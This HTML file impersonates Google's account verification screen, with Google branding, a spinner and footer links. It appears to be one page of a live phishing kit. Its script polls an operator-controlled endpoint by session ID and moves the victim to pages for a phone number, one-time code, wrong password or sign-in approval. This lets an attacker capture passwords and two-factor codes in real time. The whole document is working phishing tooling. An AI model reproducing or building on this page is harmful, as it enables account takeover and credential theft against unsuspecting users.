
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account verification - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Google Sans", Roboto, Arial, sans-serif;
        }

        body {
            background: #f0f4f9;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            width: 1060px;
            margin: 0 auto;
            padding: 20px;
        }

        .signin-card {
            background: #fff;
            border-radius: 25px;
            padding: 35px 40px 36px;
            text-align: center;
            max-width: 600px;
            margin: 0 auto;
        }

        .google-logo {
            width: 48px;
            height: 48px;
            margin: 0 auto 32px;
        }

        h1 {
            color: #202124;
            font-size: 32px;
            font-weight: 400;
            margin-bottom: 16px;
        }

        .subtitle {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 32px;
            line-height: 1.5;
        }

        .spinner {
            width: 40px;
            height: 40px;
            margin: 32px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-message {
            color: #5f6368;
            font-size: 14px;
            margin: 16px 0;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            margin-top: 40px;
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: #5f6368;
            font-size: 12px;
            text-decoration: none;
        }

        @media (max-width: 945px) {
            .signin-card {
                margin: 0 20px;
                padding: 48px 24px;
            }

            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <svg class="google-logo" viewBox="0 0 40 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
            </svg>
            
            <h1>Verifying your account</h1>
            <p class="subtitle">Please wait while we verify your account information</p>
            
            <div class="spinner"></div>
            
            <div class="status-message">
                This may take a few moments...
            </div>
        </div>

        <div class="footer">
            <select>
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session_id');

        if (!sessionId) {
            window.location.href = '/';
        }

        // Poll for status updates
        async function pollStatus() {
            try {
                const response = await fetch(`/api/poll_status/${sessionId}`);
                const data = await response.json();
                
                if (data.status === 'phone') {
                    window.location.href = `/phone?session_id=${sessionId}`;
                } else if (data.status === 'phone_otp') {
                    window.location.href = `/phone_otp?session_id=${sessionId}`;
                } else if (data.status === 'wrong_password') {
                    window.location.href = `/wrong_password?session_id=${sessionId}`;
                } else if (data.status === 'wrong-phone_otp') {
                    window.location.href = `/wrong-phone_otp?session_id=${sessionId}`;
                } else if (data.status === 'sign_in_request') {
                    window.location.href = `/sign_in_request?session_id=${sessionId}`;
                } else if (data.status === 'success') {
                    window.location.href = `/success?session_id=${sessionId}`;
                }
            } catch (error) {
                console.error('Error polling status:', error);
            }
        }

        // Poll every 3 seconds
        setInterval(pollStatus, 3000);
        
        // Initial poll
        pollStatus();
    </script>
</body>
</html>
